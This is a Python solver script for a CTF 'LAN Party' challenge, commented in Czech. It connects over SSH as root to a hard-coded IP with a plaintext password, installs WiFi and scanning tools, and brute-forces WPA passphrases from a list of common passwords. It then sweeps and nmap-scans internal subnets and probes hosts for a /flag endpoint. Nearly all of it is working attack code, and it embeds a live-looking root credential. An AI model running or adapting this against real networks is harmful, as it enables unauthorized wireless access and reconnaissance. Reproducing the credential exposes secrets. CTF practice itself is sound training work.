#!/usr/bin/env python3
"""
CTF LAN Party - Flag 01 Solver v7
KLÍČ: apk je dostupný -> nainstalujeme wpa_supplicant + iw!
"""

import paramiko
import time
import re

SSH_HOST = "52.58.32.176"
SSH_PORT = 22
SSH_USER = "root"
SSH_PASS = "a693HpuH0FbNJUxMlDhXKeRPHkLUDlj"


def run(client, cmd, timeout=60):
    _, stdout, stderr = client.exec_command(cmd, timeout=timeout)
    out = stdout.read().decode()
    err = stderr.read().decode()
    combined = out + err
    if combined.strip():
        print(f"  {combined.strip()[:3000]}")
    return combined


def check_flag(text):
    flags = re.findall(r'haxagon\{[^}]+\}', text)
    for f in flags:
        print(f"\n{'=' * 60}\n[!!!] VLAJKA: {f}\n{'=' * 60}")
    return bool(flags)


def main():
    print("[*] Připojuji se na SSH...")
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(SSH_HOST, port=SSH_PORT, username=SSH_USER, password=SSH_PASS, timeout=10)
    print("[+] Připojeno!\n")

    # === FÁZE 1: Nainstalovat WiFi nástroje přes apk ===
    print("=" * 60)
    print("[1] Instalace wpa_supplicant + iw přes apk")
    print("=" * 60)

    print("\n[*] Přidávám Alpine repozitáře a instaluji:")
    r = run(client, "apk update 2>&1 | tail -5", timeout=30)

    r = run(client, "apk add wpa_supplicant iw wireless-tools 2>&1", timeout=60)

    print("\n[*] Ověření instalace:")
    run(client, "which wpa_supplicant iw iwconfig iwlist 2>/dev/null || echo 'not found'")

    # === FÁZE 2: iw scan ===
    print("\n" + "=" * 60)
    print("[2] WiFi scan přes iw")
    print("=" * 60)

    print("\n[*] iw dev wlan0 scan:")
    r = run(client, "ip link set wlan0 up; sleep 1; iw dev wlan0 scan 2>&1", timeout=20)
    check_flag(r)

    # Extrahovat SSID
    ssids = re.findall(r'SSID: (.+)', r)
    bssids = re.findall(r'BSS ([0-9a-f:]+)', r)
    print(f"\n[*] Nalezené SSID: {ssids}")
    print(f"[*] Nalezené BSSID: {bssids}")

    if not ssids:
        print("\n[*] Opakuji scan...")
        r = run(client, "iw dev wlan0 scan 2>&1", timeout=20)
        ssids = re.findall(r'SSID: (.+)', r)
        bssids = re.findall(r'BSS ([0-9a-f:]+)', r)

    # === FÁZE 3: Připojení přes wpa_supplicant ===
    print("\n" + "=" * 60)
    print("[3] Připojení k WiFi")
    print("=" * 60)

    if ssids:
        for ssid in ssids:
            ssid = ssid.strip()
            print(f"\n[*] Zkouším SSID='{ssid}'")

            # Nejprve zkus open (bez hesla)
            r = run(client, f"""
killall wpa_supplicant 2>/dev/null; sleep 1
cat > /tmp/wpa_open.conf << 'EOF'
network={{
    ssid="{ssid}"
    key_mgmt=NONE
    scan_ssid=1
}}
EOF
wpa_supplicant -B -i wlan0 -c /tmp/wpa_open.conf -D nl80211 2>&1
sleep 4
wpa_cli -i wlan0 status 2>/dev/null
""", timeout=20)
            check_flag(r)

            if "COMPLETED" in r:
                print(f"[+] PŘIPOJENO (open) k '{ssid}'!")
                break

            # Zkus s hesly
            for pw in ["password", "12345678", "lanparty", "haxagon", "gaming",
                       "party123", "admin", "wifi", "internet", "ctf2024", "ctf2025"]:
                r2 = run(client, f"""
killall wpa_supplicant 2>/dev/null; sleep 1
wpa_passphrase '{ssid}' '{pw}' > /tmp/wpa_try.conf
wpa_supplicant -B -i wlan0 -c /tmp/wpa_try.conf -D nl80211 2>&1
sleep 4
wpa_cli -i wlan0 status 2>/dev/null | grep -E 'wpa_state|ssid'
""", timeout=20)
                if "COMPLETED" in r2:
                    print(f"[+] PŘIPOJENO! SSID='{ssid}' heslo='{pw}'")
                    check_flag(r2)
                    break
    else:
        # Žádné SSID nenalezeno - zkusíme vše
        print("\n[*] SSID nenalezeno iw scanem - zkouším wpa_supplicant scan:")
        r = run(client, """
killall wpa_supplicant 2>/dev/null; sleep 1
cat > /tmp/wpa_empty.conf << 'EOF'
ctrl_interface=/var/run/wpa_supplicant
ap_scan=1
EOF
wpa_supplicant -B -i wlan0 -c /tmp/wpa_empty.conf -D nl80211 2>&1
sleep 3
wpa_cli -i wlan0 scan 2>/dev/null
sleep 5
wpa_cli -i wlan0 scan_results 2>/dev/null
""", timeout=30)
        check_flag(r)
        ssids_from_wpa = re.findall(r'\t([^\t]+)$', r, re.MULTILINE)
        print(f"[*] wpa_cli scan_results: {r}")

    # === FÁZE 4: Stav po připojení + hledání routeru ===
    print("\n" + "=" * 60)
    print("[4] Stav sítě a hledání routeru")
    print("=" * 60)

    r = run(client, "wpa_cli -i wlan0 status 2>/dev/null")
    check_flag(r)
    run(client, "ip addr show wlan0")
    run(client, "ip route")

    if "COMPLETED" in r:
        # Získat IP přes DHCP
        print("\n[*] DHCP na wlan0:")
        run(client, "udhcpc -i wlan0 -t 10 2>&1 || dhclient wlan0 2>&1", timeout=20)
        run(client, "ip addr show wlan0; ip route")

        # Hledat router
        gw = run(client, "ip route | grep 'via' | grep wlan0 | awk '{print $3}'").strip()
        print(f"\n[*] Gateway na wlan0: {gw}")

        for ip in ([gw] if gw else []) + ["10.0.0.1", "10.0.0.254", "10.0.0.2"]:
            for port in [80, 8080, 8000, 1234, 443]:
                r2 = run(client, f"curl -s --max-time 5 http://{ip}:{port}/flag 2>/dev/null")
                check_flag(r2)

        # Ping sweep WiFi sítě
        run(client, """
for i in $(seq 1 254); do
    ping -c1 -W1 10.0.0.$i > /dev/null 2>&1 && echo "UP: 10.0.0.$i" &
done
wait
""", timeout=60)

        run(client, "arp -a | grep wlan0 2>/dev/null || ip neigh")

    # === FÁZE 5: genl-ctrl-list + nl tools ===
    print("\n" + "=" * 60)
    print("[5] libnl nástroje - průzkum nl80211")
    print("=" * 60)

    r = run(client, "genl-ctrl-list 2>/dev/null")
    r2 = run(client, "nl-link-list 2>/dev/null")

    # === FÁZE 6: apk add nmap + scan ===
    print("\n" + "=" * 60)
    print("[6] Instalace nmap + full scan")
    print("=" * 60)

    run(client, "apk add nmap 2>&1 | tail -3", timeout=30)
    r = run(client, "nmap -sV --open -p 1-10000 10.20.0.2 10.20.0.15 10.20.0.30 2>/dev/null", timeout=120)
    check_flag(r)

    # === FÁZE 7: Scan WiFi sítě nmap ===
    print("\n" + "=" * 60)
    print("[7] nmap scan WiFi sítě 10.0.0.0/24")
    print("=" * 60)

    r = run(client, "nmap -sn --min-rate 1000 10.0.0.0/24 2>/dev/null | grep -E 'report|Nmap'", timeout=60)
    check_flag(r)

    hosts = re.findall(r'report for ([\d.]+)', r)
    print(f"[*] Živé hosty na WiFi: {hosts}")
    for host in hosts:
        if host == "10.0.0.10":
            continue
        r2 = run(client, f"nmap -sV --open -p 1-10000 {host} 2>/dev/null", timeout=60)
        check_flag(r2)
        for port in [80, 8080, 8000, 1234, 443]:
            r3 = run(client, f"curl -s --max-time 5 http://{host}:{port}/flag 2>/dev/null")
            check_flag(r3)

    print("\n[*] Konec.")
    client.close()


if __name__ == "__main__":
    main()